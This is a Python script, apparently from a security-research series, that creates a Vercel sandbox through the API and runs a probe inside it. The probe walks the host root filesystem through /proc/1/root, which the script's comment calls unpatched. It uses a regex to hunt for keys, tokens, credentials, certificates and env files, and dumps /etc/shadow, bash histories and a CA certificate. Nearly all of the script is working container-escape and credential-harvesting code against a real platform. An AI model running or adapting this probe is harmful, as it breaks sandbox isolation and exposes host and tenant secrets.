# 实验J80: /proc/1/root 宿主 rootfs 深度枚举 (未patch) — 找敏感文件
import json, time, urllib.request, urllib.error, sys, base64, re
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj80"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re

R = "/proc/1/root"
SENS_RE = re.compile(r"(key|token|secret|cred|priv|sig|auth|passw|\.pem|\.crt|\.key|\.toml|\.yaml|\.json|\.env|credential|identity)", re.I)
SKIP_DIRS = ("proc", "sys", "dev", "lib", "usr", "bin", "sbin", "boot", "lost+found", "snap", "lib64", "lib32")

def walk(root, depth=0, maxdepth=5):
    found = []
    if depth > maxdepth:
        return found
    try:
        entries = sorted(os.listdir(root))
    except Exception:
        return found
    for e in entries:
        p = os.path.join(root, e)
        try:
            st = os.lstat(p)
            if os.path.isdir(p) and not os.path.islink(p):
                if e in SKIP_DIRS:
                    continue
                found += walk(p, depth + 1, maxdepth)
            else:
                found.append((p, st.st_size))
        except Exception:
            pass
    return found

print("== [1] 顶层目录 ==", flush=True)
try:
    for e in sorted(os.listdir(R)):
        print("  /" + e, flush=True)
except Exception as e:
    print("  top EXC:", e, flush=True)

print("== [2] 敏感目录枚举 (etc/run/volumes/var/srv/opt/root/home/tmp) ==", flush=True)
for d in ["etc", "run", "volumes", "var", "srv", "opt", "root", "home", "tmp", "mnt", "media", "data"]:
    root = os.path.join(R, d)
    if not os.path.isdir(root):
        continue
    print("--- /%s ---" % d, flush=True)
    try:
        files = walk(root, 0, 4)
    except Exception as e:
        print("  walk EXC:", e, flush=True)
        continue
    for p, size in files:
        rel = p[len(R):]
        if SENS_RE.search(rel) and size > 0:
            print("  SENS %8d  %s" % (size, rel), flush=True)
    print("  (%d files total)" % len(files), flush=True)

print("== [3] 关键敏感文件内容 ==", flush=True)
for f in ["/etc/shadow", "/etc/passwd", "/etc/hosts", "/etc/resolv.conf",
          "/run/cell/ca-cert.pem", "/run/vercel/share/init.sock",
          "/root/.bash_history", "/home/vercel-sandbox/.bash_history",
          "/etc/ssl/private", "/etc/kubernetes", "/etc/docker"]:
    p = R + f
    if os.path.exists(p):
        if os.path.isdir(p):
            print("  [DIR] %s: %s" % (f, os.listdir(p)[:20]), flush=True)
        else:
            try:
                d = open(p, "rb").read(300)
                print("  [FILE] %s (%d): %r" % (f, len(d), d[:300]), flush=True)
            except Exception as e:
                print("  [FILE] %s read EXC: %s" % (f, e), flush=True)
    else:
        print("  [MISS] %s" % f, flush=True)

print("== [4] /proc/1/root 全盘敏感文件名搜索 (深度3) ==", flush=True)
try:
    files = walk(R, 0, 3)
except Exception as e:
    files = []
    print("  walk EXC:", e, flush=True)
hits = [(p, s) for p, s in files if SENS_RE.search(p) and s > 0 and "/proc/" not in p and "/sys/" not in p]
for p, s in hits[:60]:
    print("  HIT %8d %s" % (s, p[len(R):]), flush=True)
print("  (%d sens hits)" % len(hits), flush=True)
"""
run_cmd(sid, PROBE, "procroot-enum", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
